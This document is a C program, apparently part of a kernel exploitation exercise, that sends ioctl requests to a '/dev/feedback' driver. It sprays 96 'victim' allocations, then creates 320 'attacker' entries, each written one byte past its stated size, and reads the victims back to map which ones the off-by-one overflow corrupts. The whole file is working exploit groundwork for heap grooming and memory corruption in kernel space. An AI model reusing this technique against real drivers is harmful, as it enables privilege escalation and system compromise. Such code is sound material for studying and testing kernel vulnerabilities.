#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) {
        perror("malloc");
        exit(1);
    }
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, unsigned char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = (char *)out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

static void print_bytes(const unsigned char *buf, int n) {
    for (int i = 0; i < n; i++) {
        printf("%02x", buf[i]);
        if (i + 1 != n) printf(":");
    }
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int victims_n = 96;
    const int attackers_n = 320;
    const uint64_t victim_base = 0x1100000;
    const uint64_t attacker_base = 0x1200000;
    unsigned char out[0x80];
    unsigned char snap[96][8];
    int changed[96];
    int create_ok = 0;

    memset(changed, 0, sizeof(changed));

    puts("[+] stage1: create victims (size=0x40)");
    for (int i = 0; i < victims_n; i++) {
        unsigned char fill = (unsigned char)(0x80 + (i & 0x3f));
        if (create_fb(fd, victim_base + i, 0x40, fill, 0x5a) != 0) {
            printf("victim create fail i=%d errno=%d\n", i, errno);
            close(fd);
            return 1;
        }
    }

    for (int i = 0; i < victims_n; i++) {
        if (read_fb(fd, victim_base + i, out, sizeof(out)) != 0) {
            printf("victim read fail i=%d errno=%d\n", i, errno);
            close(fd);
            return 1;
        }
        memcpy(snap[i], out, 8);
    }

    puts("[+] stage2: create attackers and map first observed victim changes");
    int edges = 0;
    for (int a = 0; a < attackers_n; a++) {
        unsigned char ov = (unsigned char)(a & 0xff);
        unsigned char fill = (unsigned char)(0x30 + (a % 0x30));
        uint64_t aid = attacker_base + (uint64_t)a;

        if (create_fb(fd, aid, 0x40, fill, ov) != 0) {
            printf("attacker create fail a=%d errno=%d\n", a, errno);
            break;
        }
        create_ok++;

        for (int v = 0; v < victims_n; v++) {
            if (read_fb(fd, victim_base + v, out, sizeof(out)) != 0) {
                printf("VFAIL a=%d v=%d id=%llu errno=%d\n",
                       a, v, (unsigned long long)(victim_base + v), errno);
                continue;
            }

            if (memcmp(out, snap[v], 8) != 0) {
                int b0_changed = (out[0] != snap[v][0]);
                int b1to7_same = (memcmp(out + 1, snap[v] + 1, 7) == 0);
                if (!changed[v]) {
                    changed[v] = 1;
                    edges++;
                    printf("EDGE a=%d aid=%llu ov=0x%02x -> v=%d vid=%llu old=",
                           a,
                           (unsigned long long)aid,
                           ov,
                           v,
                           (unsigned long long)(victim_base + v));
                    print_bytes(snap[v], 8);
                    printf(" new=");
                    print_bytes(out, 8);
                    printf(" b0chg=%d tail_same=%d\n", b0_changed, b1to7_same);
                }
                memcpy(snap[v], out, 8);
            }
        }

        if ((a % 32) == 0) {
            printf(".. a=%d edges=%d\n", a, edges);
        }
    }

    int untouched = 0;
    for (int v = 0; v < victims_n; v++) {
        if (!changed[v]) untouched++;
    }
    printf("[+] summary attackers_ok=%d edges=%d untouched_victims=%d\n", create_ok, edges, untouched);

    puts("[+] cleanup");
    for (int i = 0; i < victims_n; i++) del_fb(fd, victim_base + i);
    for (int i = 0; i < attackers_n; i++) del_fb(fd, attacker_base + i);

    close(fd);
    puts("[+] done");
    return 0;
}